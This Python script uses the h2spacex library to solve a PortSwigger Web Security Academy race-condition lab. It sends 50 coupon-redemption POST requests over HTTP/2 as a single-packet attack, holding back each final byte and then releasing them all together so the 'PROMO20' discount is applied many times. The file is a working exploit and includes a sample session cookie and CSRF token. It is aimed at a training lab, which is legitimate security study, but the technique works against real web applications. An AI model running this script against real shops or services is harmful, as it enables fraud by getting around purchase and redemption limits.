# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames


# change this host name to new generated one
host = 'SET BURP LAB HOSTNAME'  # e.g. 80039032808bc8120074f009c008b.web-security-academy.net
h2_conn = H2OnTlsConnection(
    hostname=host,
    port_number=443
)

h2_conn.setup_connection()

# change these headers
headers = """Cookie: session=pMjRprvJ4GL6reoXUCAzR9ayUcmvwvQ8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: https://80039032808bc8120074f009c008b.web-security-academy.net
Referer: https://80039032808bc8120074f009c008b.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
"""

# change the CSRF code to new one
body = 'csrf=42Crnu9yhyIAjBjHuAQlFNtSo72fiLSJ&coupon=PROMO20'

try_num = 50

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte

for i in range(0, try_num):
    header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
        method='POST',
        headers_string=headers,
        scheme='https',
        stream_id=stream_ids_list[i],
        authority=host,
        body=body,
        path='/cart/coupon'
    )

    all_headers_frames.append(header_frames_without_last_byte)
    all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
    temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
    temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()
